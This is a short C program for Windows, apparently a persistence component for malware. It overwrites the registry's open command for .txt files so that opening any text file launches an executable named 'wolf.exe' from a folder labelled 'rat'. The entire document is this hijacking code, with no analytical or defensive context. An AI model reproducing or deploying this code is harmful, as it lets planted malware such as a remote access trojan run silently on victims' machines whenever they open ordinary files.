#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  const char* cmd = "C:\\Users\\snowwolf\\Desktop\\rat\\pre\\wolf.exe";
  LONG res = RegOpenKeyEx(HKEY_CLASSES_ROOT, (LPCSTR)"\\txtfile\\shell\\open\\command", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(hkey, (LPCSTR)"", 0, REG_SZ, (unsigned char*)cmd, strlen(cmd));
    RegCloseKey(hkey);
  }
  return 0;
}
